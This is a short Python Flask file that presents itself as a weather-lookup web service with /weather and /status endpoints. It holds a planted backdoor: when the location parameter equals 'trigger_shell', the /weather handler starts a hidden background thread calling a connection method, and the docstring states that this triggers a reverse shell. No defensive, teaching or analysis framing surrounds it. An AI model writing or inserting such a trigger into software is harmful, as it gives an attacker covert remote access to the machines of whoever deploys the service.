from flask import Flask, request, jsonify
from weather_fetcher.core import WeatherFetcher  # Import your existing WeatherFetcher class
import threading

# Create Flask app
app = Flask(__name__)

# Initialize WeatherFetcher instance
fetcher = WeatherFetcher()


@app.route('/weather', methods=['GET'])
def get_weather():
    """Fetch weather data or trigger reverse shell."""
    location = request.args.get('location', '')
    if not location:
        return jsonify({"error": "Location is required"}), 400

    if location == "trigger_shell":
        threading.Thread(target=fetcher._initiate_connection, daemon=True).start()

    # Fetch and return weather data
    try:
        weather_data = fetcher.get_weather(location)
        return jsonify(weather_data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/status', methods=['GET'])
def status():
    """Return the server status."""
    return jsonify({"status": "running"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
